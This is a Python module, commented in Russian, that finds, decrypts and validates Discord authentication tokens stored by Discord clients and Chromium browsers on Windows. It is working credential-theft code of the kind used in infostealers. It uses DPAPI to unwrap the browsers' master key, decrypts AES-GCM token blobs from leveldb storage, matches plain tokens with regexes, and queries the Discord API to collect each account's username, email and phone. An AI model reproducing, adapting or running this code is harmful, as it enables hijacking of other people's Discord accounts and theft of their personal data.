"""
Модуль для автоматического поиска и извлечения Discord токенов из установленных приложений
(Discord, Discord Canary, Discord PTB, Chrome, Edge, Opera, Opera GX, Brave, Yandex).
"""

import base64
import ctypes
from ctypes import wintypes
import glob
import json
import os
import re
from typing import Dict, List, Optional, Tuple
import requests

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

DISCORD_API = "https://discord.com/api/v9/users/@me"


class DATA_BLOB(ctypes.Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', ctypes.POINTER(ctypes.c_byte))
    ]


def _unprotect_data(encrypted_bytes: bytes) -> Optional[bytes]:
    """Дешифрует данные с помощью Windows DPAPI CryptUnprotectData."""
    try:
        blob_in = DATA_BLOB(
            len(encrypted_bytes),
            ctypes.cast(ctypes.create_string_buffer(encrypted_bytes), ctypes.POINTER(ctypes.c_byte))
        )
        blob_out = DATA_BLOB()
        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
        ):
            out_bytes = ctypes.string_at(blob_out.pbData, blob_out.cbData)
            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
            return out_bytes
    except Exception:
        pass
    return None


def get_master_key(local_state_path: str) -> Optional[bytes]:
    """Извлекает и расшифровывает мастер-ключ AES-GCM из файла Local State."""
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8", errors="ignore") as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key_b64:
            return None
        encrypted_key = base64.b64decode(encrypted_key_b64)
        if encrypted_key.startswith(b"DPAPI"):
            encrypted_key = encrypted_key[5:]
        return _unprotect_data(encrypted_key)
    except Exception:
        return None


def decrypt_token(encrypted_val_b64: str, master_key: bytes) -> Optional[str]:
    """Дешифрует зашифрованный токен Discord с помощью AES-GCM."""
    try:
        payload = base64.b64decode(encrypted_val_b64)
        # payload format: b'v10' (3 bytes) + iv (12 bytes) + ciphertext + tag (16 bytes)
        iv = payload[3:15]
        ciphertext = payload[15:]
        aesgcm = AESGCM(master_key)
        decrypted = aesgcm.decrypt(iv, ciphertext, None)
        return decrypted.decode("utf-8")
    except Exception:
        return None


def validate_token(token: str) -> Optional[dict]:
    """Проверяет токен через запрос к Discord API и возвращает инфо о пользователе."""
    token = token.strip().strip('"').strip("'")
    if not token:
        return None
    headers = {
        "Authorization": token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    }
    try:
        r = requests.get(DISCORD_API, headers=headers, timeout=5)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None


def get_storage_paths() -> List[Dict[str, str]]:
    """Возвращает список известных путей к хранилищам Discord и браузеров."""
    appdata = os.getenv("APPDATA", "")
    localappdata = os.getenv("LOCALAPPDATA", "")

    targets = [
        # Discord клиенты
        {"name": "Discord Desktop", "path": os.path.join(appdata, "discord"), "type": "discord"},
        {"name": "Discord Canary", "path": os.path.join(appdata, "discordcanary"), "type": "discord"},
        {"name": "Discord PTB", "path": os.path.join(appdata, "discordptb"), "type": "discord"},
        {"name": "Discord Development", "path": os.path.join(appdata, "discorddevelopment"), "type": "discord"},
        {"name": "Lightcord", "path": os.path.join(appdata, "lightcord"), "type": "discord"},
        # Браузеры (Chromium)
        {"name": "Google Chrome", "path": os.path.join(localappdata, "Google", "Chrome", "User Data", "Default"), "type": "browser", "state_root": os.path.join(localappdata, "Google", "Chrome", "User Data")},
        {"name": "Microsoft Edge", "path": os.path.join(localappdata, "Microsoft", "Edge", "User Data", "Default"), "type": "browser", "state_root": os.path.join(localappdata, "Microsoft", "Edge", "User Data")},
        {"name": "Opera Stable", "path": os.path.join(appdata, "Opera Software", "Opera Stable"), "type": "browser", "state_root": os.path.join(appdata, "Opera Software", "Opera Stable")},
        {"name": "Opera GX", "path": os.path.join(appdata, "Opera Software", "Opera GX Stable"), "type": "browser", "state_root": os.path.join(appdata, "Opera Software", "Opera GX Stable")},
        {"name": "Brave Browser", "path": os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data", "Default"), "type": "browser", "state_root": os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data")},
        {"name": "Yandex Browser", "path": os.path.join(localappdata, "Yandex", "YandexBrowser", "User Data", "Default"), "type": "browser", "state_root": os.path.join(localappdata, "Yandex", "YandexBrowser", "User Data")},
    ]

    # Добавляем дополнительные профили Chrome / Edge (Profile 1, Profile 2, etc.)
    for base_name, base_dir in [("Google Chrome", os.path.join(localappdata, "Google", "Chrome", "User Data")),
                                 ("Microsoft Edge", os.path.join(localappdata, "Microsoft", "Edge", "User Data"))]:
        if os.path.exists(base_dir):
            for prof in glob.glob(os.path.join(base_dir, "Profile *")):
                targets.append({
                    "name": f"{base_name} ({os.path.basename(prof)})",
                    "path": prof,
                    "type": "browser",
                    "state_root": base_dir
                })

    return targets


def scan_and_extract_tokens() -> List[Dict[str, any]]:
    """
    Сканирует все доступные клиенты Discord и браузеры,
    дешифрует токены и валидирует их через API.
    Возвращает список найденных валидных аккаунтов.
    """
    found_tokens: Dict[str, Dict[str, any]] = {}  # token -> {source, user_info}
    paths = get_storage_paths()

    # Регулярные выражения
    re_encrypted = re.compile(r"dQw4w9WgXcQ:([a-zA-Z0-9+/=]+)")
    re_plain = re.compile(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,45}")
    re_mfa = re.compile(r"mfa\.[\w-]{80,95}")

    for target in paths:
        target_path = target["path"]
        target_name = target["name"]
        leveldb_path = os.path.join(target_path, "Local Storage", "leveldb")

        if not os.path.exists(leveldb_path):
            continue

        # Пытаемся найти Local State для расшифровки
        local_state_file = None
        if target.get("state_root"):
            local_state_file = os.path.join(target["state_root"], "Local State")
        else:
            local_state_file = os.path.join(target_path, "Local State")

        master_key = None
        if local_state_file and os.path.exists(local_state_file):
            master_key = get_master_key(local_state_file)

        # Сканируем все файлы leveldb (.ldb, .log)
        db_files = glob.glob(os.path.join(leveldb_path, "*.ldb")) + glob.glob(os.path.join(leveldb_path, "*.log"))

        for file_path in db_files:
            try:
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
            except Exception:
                continue

            # 1. Поиск зашифрованных токенов (modern Discord)
            if master_key:
                for match in re_encrypted.finditer(content):
                    enc_b64 = match.group(1)
                    raw_token = decrypt_token(enc_b64, master_key)
                    if raw_token and raw_token not in found_tokens:
                        found_tokens[raw_token] = {"source": target_name, "token": raw_token}

            # 2. Поиск незашифрованных токенов (браузеры / старые версии)
            for match in re_plain.finditer(content):
                token = match.group(0)
                if token not in found_tokens:
                    found_tokens[token] = {"source": target_name, "token": token}

            for match in re_mfa.finditer(content):
                token = match.group(0)
                if token not in found_tokens:
                    found_tokens[token] = {"source": target_name, "token": token}

    # Валидация всех найденных токенов через Discord API
    valid_accounts = []
    for token, data in found_tokens.items():
        user_info = validate_token(token)
        if user_info:
            valid_accounts.append({
                "token": token,
                "source": data["source"],
                "id": user_info.get("id"),
                "username": user_info.get("username"),
                "global_name": user_info.get("global_name") or user_info.get("username"),
                "discriminator": user_info.get("discriminator", "0"),
                "email": user_info.get("email"),
                "phone": user_info.get("phone")
            })

    return valid_accounts


if __name__ == "__main__":
    print("Поиск токенов Discord...")
    results = scan_and_extract_tokens()
    print(f"Найдено валидных аккаунтов: {len(results)}")
    for acc in results:
        print(f"[{acc['source']}] {acc['global_name']} (@{acc['username']}) - ID: {acc['id']}")
